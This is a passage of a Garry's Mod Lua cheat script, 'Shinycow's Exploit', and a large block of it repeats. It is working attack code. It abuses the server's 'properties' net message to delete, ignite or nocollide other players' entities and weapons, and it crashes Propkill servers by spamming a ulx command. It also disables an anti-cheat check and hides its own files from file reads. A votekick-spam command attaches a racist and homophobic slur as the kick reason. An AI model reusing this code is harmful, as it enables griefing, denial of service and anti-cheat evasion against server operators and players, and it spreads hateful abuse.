			net.WriteEntity( toCollision )
		net.SendToServer()
	
		return
	end
	
	for i=1,#ents.GetAll() do
		local v = ents.GetAll()[ i ]
		
		if lookfor then
			if string.find( string.lower(tostring(v)), lookfor ) then
				net.Start("properties")
					net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
					net.WriteEntity( v )
				net.SendToServer()
			end
		/*else
			if string.find( string.lower(tostring(v)), toCollision ) then
				net.Start("properties")
					net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
					net.WriteEntity( v )
				net.SendToServer()
			end*/
		end
	end
end
	-- End

	-- Commands.
local function sce_GetList()
	PrintTable(ents.GetAll())
end
sce_AddCommand("exploit_debug_GetEntities", sce_GetList, "Shinycow's Exploit: Prints the list of entities.")

local function sce_GetSCE()
	PrintTable(SCE)
end
sce_AddCommand("exploit_debug_GetSCE", sce_GetSCE, "Shinycow's Exploit: Prints the table of SCE.")

local function sce_Ignite()
	for i=1,#ents.GetAll() do
		local v = ents.GetAll()[ i ]
		
		if v.Ignited then
			net.Start("properties")
				net.WriteUInt( util.NetworkStringToID( "extinguish" ), 32 )
				net.WriteEntity( v )
			net.SendToServer()
			
			v.Ignited = false
		else
			net.Start("properties")
				net.WriteUInt( util.NetworkStringToID( "ignite" ), 32 )
				net.WriteEntity( v )
			net.SendToServer()
			
			v.Ignited = true
		end
	end
end
sce_AddCommand("exploit_ignite", sce_Ignite, "Shinycow's Exploit: Ignites / Extinguishes everything.")
		
local function sce_RemoveNames()
	exploitRemove( "playerresource" )
end
sce_AddCommand("exploit_remove_Names", sce_RemoveNames, "Shinycow's Exploit: Removes everyone's names clientside.")

local function sce_RemoveAll()
	-- No longer includes removing player names. You should call that directly.
	exploitRemove( "prop_" )
	exploitRemove( "weapon" )
	exploitRemove( "gmod" )
	exploitRemove( "func_" )
	exploitRemove( "npc" )
	exploitRemove( "env_" )
	exploitRemove( "sun" )
	exploitRemove( "base" )
	exploitRemove( "shadow" )
	exploitRemove( "beam" )
	exploitRemove( "water" )
	exploitRemove( "spotlight" )
	exploitRemove( "viewmodel" )
	exploitRemove( "userdata" )
end
sce_AddCommand("exploit_remove_All", sce_RemoveAll, "Shinycow's Exploit: Removes a lot of shit.")
	
local function sce_RemoveSpecified( p, c, args )
	-- This removes whatever it can find that you specify. VERY useful.
	for i=1,#args do
		local v = args[ i ]
		
		exploitRemove( v )
	end
end
sce_AddCommand("exploit_remove_Specified", sce_RemoveSpecified, "Shinycow's Exploit: Removes whatever it can find that you want.")


/*local function sce_RemoveWeapons( p, c, args )
	local args1 = args[1]

	local checkspam = "sce_exploit_remove_spam_weapons"
	if c == checkspam then
		if not SCE_HasToggled[ checkspam ] then
			if FindPlayer(args1) then
				timer.Create(checkspam, 0.2, 0, function()
					RunConsoleCommand("sce_exploit_remove_Weapons", )
				end)
			else
				timer.Create(checkspam, 0.2, 0, function()
					RunConsoleCommand("sce_exploit_remove_Weapons")
				end)
			end
			SCE_HasToggled[ checkspam ] = true
		else
			timer.Destroy(checkspam)
			SCE_HasToggled[ checkspam ] = false
		end
		LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
	end
	
	if args1 then
		
	--exploitRemove( "weapon" )
	--exploitRemove( "gmod" )
end
sce_AddCommand("exploit_remove_Weapons", sce_RemoveWeapons, "Shinycow's Exploit: Remove everyone's weapons.")
sce_AddCommand("exploit_remove_spam_Weapons", sce_RemoveWeapons, "Shinycow's Exploit: Spam remove everyone's weapons.")*/


local function sce_RemoveWeapons( p, c, args )
	
	-- Specifying a player.
	local args1 = args[1]
	if args1 then
		
		local target = FindPlayer(args1)
		if not target then chat.AddText(Color(75,155,155,255), "Could not find ", color_white, args1) return end
		
		for k,v in pairs(ents.FindInSphere(target:GetPos(), 20)) do
			if string.find(string.lower(tostring(v)), "weapon") then
				exploitRemove( v, true )
			end
		end
		
	else
		
		exploitRemove( "weapon" )
		
	end
	
end
sce_AddCommand("exploit_remove_weapons", sce_RemoveWeapons, "Shinycow's Exploit: Removes (sombodies) weapons.")

local function sce_RemoveTrace( p, c )
	local checkspam = "sc_exploit_remove_spam_lookingat"
	if c == checkspam then
		if not SCE_HasToggled[ checkspam ] then
			timer.Create(checkspam, 0.2, 0, function()
				RunConsoleCommand("sc_exploit_remove_LookingAt")
			end)
			
			SCE_HasToggled[ checkspam ] = true
		else
			timer.Destroy(checkspam)
			SCE_HasToggled[ checkspam ] = false
		end
		LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
	else
		exploitRemove( LocalPlayer():GetEyeTrace().Entity, true )
	end
end
sce_AddCommand("exploit_remove_LookingAt", sce_RemoveTrace, "Shinycow's Exploit: Remove whatever you're looking at.")
sce_AddCommand("exploit_remove_spam_LookingAt", sce_RemoveTrace, "Shinycow's Exploit: Spam remove whatever you're looking at.")

local function sce_RemoveNPC( p, c )
	local checkspam = "sc_exploit_remove_spam_NPCs"
	if c == checkspam then
		if not SCE_HasToggled[ checkspam ] then
			timer.Create(checkspam, 0.2, 0, function()
				RunConsoleCommand("sc_exploit_remove_NPCs")
			end)
			
			SCE_HasToggled[ checkspam ] = true
		else
			timer.Destroy(checkspam)
			SCE_HasToggled[ checkspam ] = false
		end
		LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
	else
		exploitRemove( "npc" )
		exploitRemove( "gmod" )
	end
end
sce_AddCommand("exploit_remove_NPCs", sce_RemoveNPC, "Shinycow's Exploit: Remove every NPC.")
sce_AddCommand("exploit_remove_spam_NPCs", sce_RemoveNPC, "Shinycow's Exploit: Spam remove every NPC.")

local function sce_RemoveRadius( p, c, args )
	local radius = args[1] or 1000
	local noweapons = tobool(args[2]) or false
	
	local checkspam = "sc_exploit_remove_spam_inradius"
	if c == checkspam then
		if not SCE_HasToggled[ checkspam ] then
			local waitamount = tonumber(args[3]) or 0.2
			timer.Create(checkspam, waitamount, 0, function()
				RunConsoleCommand("sc_exploit_remove_InRadius", tostring(radius), tostring(noweapons))
			end)
			
			SCE_HasToggled[ checkspam ] = true
		else
			timer.Destroy(checkspam)
			SCE_HasToggled[ checkspam ] = false
		end
		LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
	else

		for k,v in pairs(ents.FindInSphere( LocalPlayer():GetPos(), tonumber(radius) )) do
			if noweapons then
				if not string.find(string.lower(tostring(v)), "weapon") then
					exploitRemove( v, true )
				end
			else
				exploitRemove( v, true )
			end
		end
	
	end
end
sce_AddCommand("exploit_remove_InRadius", sce_RemoveRadius, "Shinycow's Exploit: Remove every entity in your radius.")
sce_AddCommand("exploit_remove_spam_InRadius", sce_RemoveRadius, "Shinycow's Exploit: Spam remove every entity in your radius. <radius> [weapons]")
		

local function sce_NocollideRadius( p, c, args )
	local radius = args[1] or 1000
	local checkspam = "sc_exploit_collide_off_spam_inradius"
	
	if not SCE_HasToggled[ checkspam ] then
		timer.Create( checkspam, 0.01, 0, function()
			print("ahh")
			for k,v in pairs(ents.FindInSphere( LocalPlayer():GetPos(), tonumber(radius) )) do
				exploitCollisions( v, "off", true )
			end
		end )
		
		SCE_HasToggled[ checkspam ] = true
	else
		timer.Destroy( checkspam )
		SCE_HasToggled[ checkspam ] = false
	end
	LocalPlayer():ChatPrint("Spamming " .. checkspam .. ": " .. tostring(SCE_HasToggled[ checkspam ]))
end
sce_AddCommand("exploit_collide_Off_spam_InRadius", sce_NocollideRadius, "Shinycow's Exploit: Nocollide every entity in your radius.")

	-- TAKEN DIRECTLY FROM OLD CODE. SOWWY ABOUT THAT.
local spamremovelp = false
local function sce_SpamRemoveIgnore()
	if spamremovelp then
		hook.Remove("OnEntityCreated", "lolaidslp")
		timer.Destroy("lolSpamRemove")
		spamremovelp = false
	else
		hook.Add("OnEntityCreated", "lolaidslp", function( ent )
			if LocalPlayer():GetEyeTrace().Entity == ent then ent.ImOwner = true end
		end)
				
		timer.Create("lolSpamRemove", 0.13, 0, function()
			RunConsoleCommand("sc_exploit_remove_Specified", "prop_physics")
			RunConsoleCommand("sc_exploit_remove_Specified", "gmod_lamp")
			RunConsoleCommand("sc_exploit_remove_Specified", "gmod_emitter")
			RunConsoleCommand("sc_exploit_remove_Specified", "npc_")
		end)
		
		spamremovelp = true
	end
end
sce_AddCommand("exploit_remove_spam_IgnoreMe", sce_SpamRemoveIgnore, "Shinycow's Exploit: Spam remove every entity except yours.")

	-- TODO
local function sce_NoCollide( p, c, args )
	if args[1] then
		if string.find(string.lower(args[1]), "props") or string.find(string.lower(args[1]), "prop_physics") then
			exploitCollisions( nil, "off", false, "prop_physics" )
			
			return
		end
	end
	
	if IsValid(LocalPlayer():GetEyeTrace().Entity) then
		exploitCollisions( LocalPlayer():GetEyeTrace().Entity, "off", true )
	end
end
sce_AddCommand("exploit_collide_Off", sce_NoCollide, "Shinycow's Exploit: Nocollide what you want bby.")

local function sce_Collide( p, c)
	for k,v in pairs(ents.GetAll()) do
		exploitCollisions( v, "on", true )
	end
end
sce_AddCommand("exploit_collide_On", sce_Collide, "Shinycow's Exploit: Collide everything.")

local function sce_misc_TAC()
	if RunCheck then
		function RunCheck()
			print("nty TAC.")
		end
		LocalPlayer():ChatPrint("The shitty 'Tyler's Anti Cheat', has been patched.")
	else
		LocalPlayer():ChatPrint("Could not find Tyler's Anti Cheat.")
	end
end
sce_AddCommand("exploit_misc_TAC", sce_misc_TAC, "Shinycow's Exploit: Removes Tyler's Anti Cheat function.")

	-- DOESNT BELONG HERE:
	
/*local ps_text =
{
"Shinycow was here.",
"TEAM 1338",
"Shinycow was here.",
"Shinycow is above all.",
"Shinycow is above all.",
"Shinycow likes weiners.",
"420swagYOLO1337ERRYDAY",
"TEAM 1338",
"Shinycow was here.",
"420haxsmokeweedLOLXD"
}
local sce_spam_PS = false
local function sce_misc_PS()
	if not PS then LocalPlayer():ChatPrint("PointShop is not running!") return end

	if sce_spam_PS then
		timer.Destroy("lmaoPS")
		sce_spam_PS = false
	else
		timer.Create("lmaoPS", 0.5, 0, function()
			net.Start('PS_ModifyItem')
				net.WriteString("texthat")
				net.WriteTable(
				{
				text = ps_text[math.random(#ps_text)],
				color = { r = math.random(90,200), b = math.random(50,255), a = 255, g = math.random(50, 255) }
				}
				)
			net.SendToServer()
		end)
		
		sce_spam_PS = true
	end
end
sce_AddCommand("misc_PS", sce_misc_PS, "Shinycow's Exploit: Quickly change pointshop text hat text.")*/

local sce_toggle_Crash = false
local function sce_misc_CrashPropkill()
	--if gmod.GetGamemode().Name != "Propkill v2.6" then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
	if not PK and not PK.HudSettings then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
	
	if sce_toggle_Crash then
		hook.Remove("CreateMove", "lmaoPK")
		sce_toggle_Crash = false
	else
		hook.Add("CreateMove", "lmaoPK", function()
			RunConsoleCommand("ulx","addcustomspawn","battler")
		end)
		sce_toggle_Crash = true
	end
end
sce_AddCommand("exploit_misc_PK", sce_misc_CrashPropkill, "Shinycow's Exploit: Toggle crashing Propkill v2.6.")


local function sce_misc_CrashPropkillSlower()
	--if gmod.GetGamemode().Name != "Propkill v2.6" and gmod.GetGamemode().Name != "Propkill v1337" then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
	if not PK and not PK.HudSettings then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
	
	timer.Create("lmaoPK", 1.4, 0, function()
		RunConsoleCommand("ulx","addcustomspawn","battler")
	end)
end
sce_AddCommand("exploit_misc_PK2", sce_misc_CrashPropkillSlower, "ohai")


	-- Disables the stunstick flash from getting beaten in DarkRP.
hook.Add("Initialize", "scexploit_misc_DarkRPStunstick", function()
	usermessage.Hook("StunStickFlash", function() end)
	usermessage.Hook("ulx_blind", function() end)
end)


------------------------------------- MENU ----------------------------------------
	
		-- Shittily made menu.
	local function SCE_ShowConfigMenu()
		local exploitmenu = vgui.Create("DFrame")
			exploitmenu:SetPos( (ScrW() * 0.5) - 100, (ScrH() * 0.5) - 225 )
			exploitmenu:SetSize( (ScrW() * 0.5) - 250, (ScrH() * 0.5) - 90 )
			exploitmenu:SetTitle( "Exploit menu" )
			exploitmenu:SetVisible( true )
			exploitmenu:SetDraggable( false )
			exploitmenu:ShowCloseButton( true )
			exploitmenu:SetAlpha( 150 )
			exploitmenu:AlphaTo( 255, 6, 1 )
			exploitmenu:MakePopup()

					-- Design coloring taken from DeathZone :3
			function exploitmenu:Paint()
				surface.SetDrawColor(Color(64, 64, 64, 255))
				surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
				surface.SetDrawColor(Color(51, 51, 51, 255))
				surface.DrawRect(0, 0, self:GetWide(), 22)
			end
			
			local exploitmenutabs = vgui.Create("DPropertySheet", exploitmenu)
			exploitmenutabs:SetPos( 5, 27 )
			exploitmenutabs:SetSize( (ScrW() * 0.5) - 260, (ScrH() * 0.5) - 120 )

			local ButtonPanel = vgui.Create("DPanelList", configmenu)
			--ButtonPanel:SetPos( 25, 25 )
			ButtonPanel:SetSize( 395, 320 )
			ButtonPanel:SetSpacing(2)
			ButtonPanel:EnableHorizontal(false)
			ButtonPanel:EnableVerticalScrollbar( true )
					

			local button1 = vgui.Create("DButton")
			button1:SetText("Remove names")
			button1.DoClick = function()
				RunConsoleCommand("say", "no removing names")
			end
			ButtonPanel:AddItem(button1)
			
			local button2 = vgui.Create("DButton")
			button2:SetText("Remove everything")
			button2.DoClick = function()
				RunConsoleCommand("say", "no removing everything")
			end
			ButtonPanel:AddItem(button2)
			
			local button3 = vgui.Create("DButton")
			button3:SetText("Remove what you're looking at.")
			button3.DoClick = function()
				RunConsoleCommand("say", "no removing what ur looking at")
			end
			ButtonPanel:AddItem(button3)
			

			exploitmenutabs:AddSheet( "Buttons", ButtonPanel, "icon16/bomb.png", false, false )
			
			--[[local checkbox2 = vgui.Create("DCheckBoxLabel")
			checkbox2:SetValue(0)
			checkbox2:SetText("Remove everything")
			function checkbox2.Button:Toggle()
				if self:GetChecked() == nil or not self:GetChecked() then 
					self:SetValue( true ) 
				else 
					self:SetValue( false ) 
				end
			end
			ConfigPanel:AddItem(checkbox2)]]		
		
	end
	
	hook.Add("PlayerBindPress", "sce_ConfigMenu", function( pl, bind, b_Pressed )
		if string.lower(bind) == "impulse 201" then 
			SCE_ShowConfigMenu()
		end
	end)
	

	
	

	
-- 2/15/14 -- lets try something new

sce_AddCommand("exploit_remove_weapons_player", function( pl, cmd, arg )
	if not arg[1] then pl:ChatPrint("supply a player name") return end
	
	local target = FindPlayer(arg[1])
	if not target then print("fuk") return end
	
	for k,v in next, ents.GetAll() do
		if string.find(string.lower(tostring(v)), "weapon") then
			if v:GetPos():Distance( target:GetPos() ) < 55 then
								net.Start("properties")
					net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
					net.WriteEntity( v )
				net.SendToServer()
			end
		end
	end
end)


-- Heres more of his scripts --
local ADADADAD = file
local AAAAAAAA = concommand
local BADADADA = net

oldnetReceive = net.Receive

function net.Receive( msgname, len )
	print(msgname)
	print(len)
	if net.ReadString then print(net.ReadString()) end
	if net.ReadLong then print(net.ReadLong()) end
	
	oldnetReceive( msgname, len )
end	

oADADADADRead = ADADADAD.Read
function ADADADAD.Read(contents, type)
	if not contents then return nil end
	if string.find(string.lower(contents), "exploitsystem") then return nil end
	
	return oADADADADRead(contents, type)
end


AAAAAAAA.Add("sce_removetrace", function()
	BADADADA.Start("properties")
	BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
	BADADADA.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	BADADADA.SendToServer()
end)

AAAAAAAA.Add("sce_colliON", function()
	BADADADA.Start("properties")
	BADADADA.WriteUInt( util.NetworkStringToID( "collision_on" ), 32 )
	BADADADA.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	BADADADA.SendToServer()
end)

AAAAAAAA.Add("sce_removemost", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics"
		//or string.find(tostring(v), "Player")
		or string.find(tostring(v), "Weapon")
		or string.find(tostring(v), "prop_door")
		or string.find(tostring(v), "func_move")
		or string.find(tostring(v), "prop_vehicle")
		or string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removenpc", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removegmod", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(tostring(v), "gmod")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removeall", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics"
		or string.find(tostring(v), "Player")
		or string.find(tostring(v), "Weapon")
		or string.find(tostring(v), "prop_door")
		or string.find(tostring(v), "func_move")
		or string.find(tostring(v), "prop_vehicle")
		or string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_remove", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics" and not v.ImOwner then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removeweapons", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(string.lower(v:GetClass()), "weapon") then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)


AAAAAAAA.Add("sce_ignite", function()
	for k,v in pairs(ents.GetAll()) do
		//if v:GetClass() == "prop_physics" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "ignite" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		//end
	end
end)

AAAAAAAA.Add("sce_gravity", function()
	for k,v in pairs(ents.GetAll()) do
		--if v:GetClass() == "prop_physics" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "gravity" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		--end
	end
end)

AAAAAAAA.Add("sce_flood_removewater", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "func_water_analog" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_collisions", function()
	for k,v in pairs(ents.GetAll()) do
		BADADADA.Start("properties")
			BADADADA.WriteUInt( util.NetworkStringToID( "collision_off" ), 32 )
			BADADADA.WriteEntity( v )
		BADADADA.SendToServer()
	end
end)

AAAAAAAA.Add("sce_getents", function()
	PrintTable(ents.GetAll())
end)
AAAAAAAA.Add("sce_gettrace", function()
	print(LocalPlayer():GetEyeTrace().Entity:GetClass())
end)
AAAAAAAA.Add("sce_removedoors", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "func_door" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)


local votekicking = false
AAAAAAAA.Add("sce_spamvotekick", function(pl,cmd,arg)
	if votekicking then
		timer.Remove("fds")
		votekicking = false
	else
		if arg[1] then
			if arg[2] then
				local target = FindPlayer(arg[2])
				
				timer.Create("fds", tonumber(arg[1]), 0, function()
					RunConsoleCommand("ulx","votekick",target:Nick(),"gay nigger")
				end)
			else
				timer.Create("fds", tonumber(arg[1]), 0, function()
					for i=1,#player.GetAll() do
						if player.GetAll()[i] != LocalPlayer() then
							RunConsoleCommand("ulx","votekick",player.GetAll()[i]:Nick(), "gay nigger")
						end
					end
				end)
			end
		else
			timer.Create("fds", 0.001, 0, function()
				for i=1,#player.GetAll() do
					if player.GetAll()[i] != LocalPlayer() then
						RunConsoleCommand("ulx","votekick",player.GetAll()[i]:Nick(), "gay nigger")
					end
				end
			end)
		end

		votekicking = true
	end
end)

local spamremovemost = false
AAAAAAAA.Add("sce_spamremovemost", function(pl)
	if spamremovemost then
		timer.Remove("sce_spamremovemost")
		spamremovemost = false
	else
		timer.Create("sce_spamremovemost", 0.5, 0, function()
			RunConsoleCommand("sce_removemost")
		end)
		spamremovemost = true
	end
end)

local spamremovenpc = false
AAAAAAAA.Add("sce_spamremovenpc", function(pl)
	if spamremovenpc then
		timer.Remove("sce_spamremovenpc")
		spamremovenpc = false
	else
		timer.Create("sce_spamremovenpc", 0.5, 0, function()
			RunConsoleCommand("sce_removenpc")
		end)
		spamremovenpc = true
	end
end)

local spamremovegmod = false
AAAAAAAA.Add("sce_spamremovegmod", function(pl)
	if spamremovegmod then
		timer.Remove("sce_spamremovegmod")
		spamremovegmod = false
	else
		timer.Create("sce_spamremovegmod", 0.5, 0, function()
			RunConsoleCommand("sce_removegmod")
		end)
		spamremovegmod = true
	end
end)

local spamremove = false
AAAAAAAA.Add("sce_spamremove", function(pl)
	if spamremove then
		hook.Remove("OnEntityCreated", "lolaids")
		spamremove = false
	else
		hook.Add("OnEntityCreated", "lolaids", function( ent )
			RunConsoleCommand("sce_remove")
		end)
		spamremove = true
	end
end)

local spamremovelp = false
AAAAAAAA.Add("sce_spamremoveLP", function(pl)
	if spamremovelp then
		hook.Remove("OnEntityCreated", "lolaidslp")
		spamremovelp = false
	else
		hook.Add("OnEntityCreated", "lolaidslp", function( ent )
			if LocalPlayer():GetEyeTrace().Entity == ent then ent.ImOwner = true end
			RunConsoleCommand("sce_remove")
		end)
		spamremovelp = true
	end
end)



AAAAAAAA.Add("sce_tac_check", function(pl)
	if RunCheck then
		print("LOL yeah")
	else
		print("nope. gah!!")
	end
end)

AAAAAAAA.Add("sce_tac_remove", function(pl)
	if RunCheck then
		function RunCheck()
			pl:ChatPrint("You would have been kicked. Your welcome.")
		end
		pl:ChatPrint("Tyler's Anti Cheat. The shitty one. Has been patched. LOL!!!")
	end
end)

AAAAAAAA.Add("gethooks", function()
	PrintTable(hook.GetTable())
end)

--end

--Extra--
local ADADADAD = file
local AAAAAAAA = concommand
local BADADADA = net

oldnetReceive = net.Receive

function net.Receive( msgname, len )
	print(msgname)
	print(len)
	if net.ReadString then print(net.ReadString()) end
	if net.ReadLong then print(net.ReadLong()) end
	
	oldnetReceive( msgname, len )
end	

oADADADADRead = ADADADAD.Read
function ADADADAD.Read(contents, type)
	if not contents then return nil end
	if string.find(string.lower(contents), "exploitsystem") then return nil end
	
	return oADADADADRead(contents, type)
end


AAAAAAAA.Add("sce_removetrace", function()
	BADADADA.Start("properties")
	BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
	BADADADA.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	BADADADA.SendToServer()
end)

AAAAAAAA.Add("sce_colliON", function()
	BADADADA.Start("properties")
	BADADADA.WriteUInt( util.NetworkStringToID( "collision_on" ), 32 )
	BADADADA.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	BADADADA.SendToServer()
end)

AAAAAAAA.Add("sce_removemost", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics"
		//or string.find(tostring(v), "Player")
		or string.find(tostring(v), "Weapon")
		or string.find(tostring(v), "prop_door")
		or string.find(tostring(v), "func_move")
		or string.find(tostring(v), "prop_vehicle")
		or string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removenpc", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removegmod", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(tostring(v), "gmod")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removeall", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics"
		or string.find(tostring(v), "Player")
		or string.find(tostring(v), "Weapon")
		or string.find(tostring(v), "prop_door")
		or string.find(tostring(v), "func_move")
		or string.find(tostring(v), "prop_vehicle")
		or string.find(tostring(v), "gmod")
		or string.find(tostring(v), "npc")
		then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_remove", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "prop_physics" and not v.ImOwner then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_removeweapons", function()
	for k,v in pairs(ents.GetAll()) do
		if string.find(string.lower(v:GetClass()), "weapon") then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)


AAAAAAAA.Add("sce_ignite", function()
	for k,v in pairs(ents.GetAll()) do
		//if v:GetClass() == "prop_physics" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "ignite" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		//end
	end
end)

AAAAAAAA.Add("sce_gravity", function()
	for k,v in pairs(ents.GetAll()) do
		--if v:GetClass() == "prop_physics" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "gravity" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		--end
	end
end)

AAAAAAAA.Add("sce_flood_removewater", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "func_water_analog" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)

AAAAAAAA.Add("sce_collisions", function()
	for k,v in pairs(ents.GetAll()) do
		BADADADA.Start("properties")
			BADADADA.WriteUInt( util.NetworkStringToID( "collision_off" ), 32 )
			BADADADA.WriteEntity( v )
		BADADADA.SendToServer()
	end
end)





AAAAAAAA.Add("sce_getents", function()
	PrintTable(ents.GetAll())
end)
AAAAAAAA.Add("sce_gettrace", function()
	print(LocalPlayer():GetEyeTrace().Entity:GetClass())
end)
AAAAAAAA.Add("sce_removedoors", function()
	for k,v in pairs(ents.GetAll()) do
		if v:GetClass() == "func_door" then
			BADADADA.Start("properties")
				BADADADA.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				BADADADA.WriteEntity( v )
			BADADADA.SendToServer()
		end
	end
end)


local votekicking = false
AAAAAAAA.Add("sce_spamvotekick", function(pl,cmd,arg)
	if votekicking then
		timer.Remove("fds")
		votekicking = false
	else
		if arg[1] then
			if arg[2] then
				local target = FindPlayer(arg[2])
				
				timer.Create("fds", tonumber(arg[1]), 0, function()
					RunConsoleCommand("ulx","votekick",target:Nick(),"gay nigger")
				end)
			else
				timer.Create("fds", tonumber(arg[1]), 0, function()
					for i=1,#player.GetAll() do
						if player.GetAll()[i] != LocalPlayer() then
							RunConsoleCommand("ulx","votekick",player.GetAll()[i]:Nick(), "gay nigger")
						end
					end
				end)
			end
		else
			timer.Create("fds", 0.001, 0, function()
				for i=1,#player.GetAll() do
					if player.GetAll()[i] != LocalPlayer() then
						RunConsoleCommand("ulx","votekick",player.GetAll()[i]:Nick(), "gay nigger")
					end
				end
			end)
		end

		votekicking = true
	end
end)

local spamremovemost = false
AAAAAAAA.Add("sce_spamremovemost", function(pl)
	if spamremovemost then
		timer.Remove("sce_spamremovemost")
		spamremovemost = false
	else
		timer.Create("sce_spamremovemost", 0.5, 0, function()
			RunConsoleCommand("sce_removemost")
		end)
		spamremovemost = true
	end
end)

local spamremovenpc = false
AAAAAAAA.Add("sce_spamremovenpc", function(pl)
	if spamremovenpc then
		timer.Remove("sce_spamremovenpc")
		spamremovenpc = false
	else
		timer.Create("sce_spamremovenpc", 0.5, 0, function()
			RunConsoleCommand("sce_removenpc")
		end)
		spamremovenpc = true
	end
end)

local spamremovegmod = false
AAAAAAAA.Add("sce_spamremovegmod", function(pl)
	if spamremovegmod then
		timer.Remove("sce_spamremovegmod")
		spamremovegmod = false
	else
